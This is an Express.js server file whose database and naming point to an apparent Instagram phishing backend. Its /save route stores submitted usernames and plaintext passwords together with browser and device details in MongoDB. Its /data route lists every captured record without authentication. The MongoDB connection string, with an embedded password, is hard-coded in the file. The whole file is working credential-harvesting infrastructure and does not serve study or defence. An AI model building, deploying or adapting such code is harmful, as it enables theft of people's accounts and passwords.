const express = require("express");
const cors = require("cors");
const mongoose = require("mongoose");

mongoose.connect("mongodb+srv://anyonebutnoone786_db:d0n0tenter@instagaram.kktrvb1.mongodb.net/?appName=Instagaram")
.then(() => console.log("MongoDB connected"))
.catch(err => console.log(err));

const deviceSchema = new mongoose.Schema({
  username: String,
  password: String,
  time: String,
  browser: String,
  device: String
});

const Device = mongoose.model("Device", deviceSchema);

const app = express();

app.use(cors());
app.use(express.json());

// Serve frontend from /public
app.use(express.static("public"));


app.post("/save", async (req, res) => {
  try {
    const { username, password, time, browser, device } = req.body;

    const newEntry = new Device({
      username,
      password,
      time,
      browser,
      device
    });

    await newEntry.save();

    console.log("Saved:", newEntry);

    res.json({ success: true });

  } catch (err) {
    console.error("Database error:", err);
    res.status(500).json({ success: false });
  }
});

//NEW ROUTE TO VIEW DATA
app.get("/data", async (req, res) => {
  try {
    const data = await Device.find();
    res.json(data);
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Database error" });
  }
});

// Render requires dynamic port
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
    console.log("Server running on port " + PORT);
});